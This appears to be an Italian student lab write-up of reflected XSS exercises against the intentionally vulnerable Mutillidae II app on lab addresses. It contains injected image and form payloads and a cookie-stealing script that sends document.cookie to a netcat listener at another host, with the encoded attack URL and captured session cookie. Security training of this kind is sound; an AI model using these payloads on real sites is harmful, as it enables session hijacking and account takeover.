# Esercizio 1
Esercizio 1 - XSS Reflected
Per questa tipologia di esercizi si può fare riferimento alla pagina (A3 - Cross Site Scripting (XSS) -> Reflected (First Order) -> User Info) raggiungibile all’indirizzo http://127.0.0.1/mutillidae/index.php?page=user-info.php. 
Come primo passo occorre valutare se la pagina è effettivamente soggetta a
vulnerabilità di tipo XSS di tipo riflesso.
## Esercizio 1.1 - Iniezione di un’immagine
In questo esercizio viene richiesto di inserire un’immagine tramite l’input text disponibile alla pagina. Per caricare un’immagine occorre utilizzare il tag html img. ref

Input "ciao"

```
&username=ciao&password=&user-info-php-submit-button=View+Account+Details
```

Chiudere il tag html ed aggiungere codice arbitrario:
```
><img src="https://i.kym-cdn.com/photos/images/newsfeed/003/034/402/a4e.png"></img>
```

## Esercizio 1.2 - Iniezione di un form html
In questo esercizio viene richiesto di inserire, tramite l’input text disponibile alla pagina, un form html che accetti un ulteriore campo input.
Un form è identificata dal tag html form ref, mentre il campo input https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input.

Form + Input:

```
><form action="https://www.google.com/search" method="get">
    <input type="text" name="q" />
    <input type="submit" value="Cerca" />
</form>
```



## Esercizio 1.3 - Ottenimento dei cookie di sessione (Cookie stealing)
In questo esercizio viene richiesto di realizzare un semplice applicativo server che stampi il
contenuto delle richieste POST ricevute (eseguitelo su localhost).
Consiglio: realizzare il web server utilizzando il linguaggio Python usando http.server
ref. Se eseguito su proprio host per problemi relativi a Cross-Origin Resource Sharing
(CORS) https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS utilizzare
Access-Control-Allow-Origin.
Una volta creato il server web si richiede di iniettare un codice javascript in grado di inviare i
cookie di sessione dell’utente malevolo.
Per testarlo:
• Iniettare lo script malevolo nella pagina http://127.0.0.1/mutillidae/index.php?page=user-
info.php e generare un URL malevolo.
• Loggarsi sull’applicativo Mutillidae II con uno degli utenti presenti nel database.
• Navigare al link malevolo generato e visualizzare sul server python i cookie di sessione
dell’utente.

Prima cosa, aprire un server nc:
```
nc -l 8080
``` 

Poi, iniettare il codice javascript:
```
<script>
    var x = new XMLHttpRequest();
    x.open("POST", "http://192.168.64.1:8080", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("cookie=" + document.cookie);
</script>
```

Sotto forma di link urlendoded:
```
http://192.168.64.21//mutillidae/index.php?page=user-info.php&username=%3E%3Cscript%3E+++++var+x+%3D+new+XMLHttpRequest%28%29%3B+++++x.open%28%22POST%22%2C+%22http%3A%2F%2F192.168.64.1%3A8080%22%2C+true%29%3B+++++x.setRequestHeader%28%22Content-Type%22%2C+%22application%2Fx-www-form-urlencoded%22%29%3B+++++x.send%28%22cookie%3D%22+%2B+document.cookie%29%3B+%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
```

Spiegazione:
- Viene creato un oggetto XMLHttpRequest per inviare una richiesta HTTP.
- Viene aperta una connessione POST al server locale sulla porta 8080.
- Viene impostato l'intestazione della richiesta per indicare che il contenuto è di tipo "application/x-www-form-urlencoded".
- Viene inviato il cookie dell'utente al server locale.
- Il server locale riceve la richiesta e stampa il cookie dell'utente.

Sul server NetCat ricevo:
```
nc -l 8080
POST / HTTP/1.1
Host: 192.168.64.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
Accept: */*
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.64.21/
Origin: http://192.168.64.21
Content-Length: 56
Accept-Language: it-IT,it;q=0.9
Priority: u=3, i
Accept-Encoding: gzip, deflate
Connection: keep-alive

cookie=showhints=1; PHPSESSID=9f5qu5n2ldvo56b369qk55p641
```

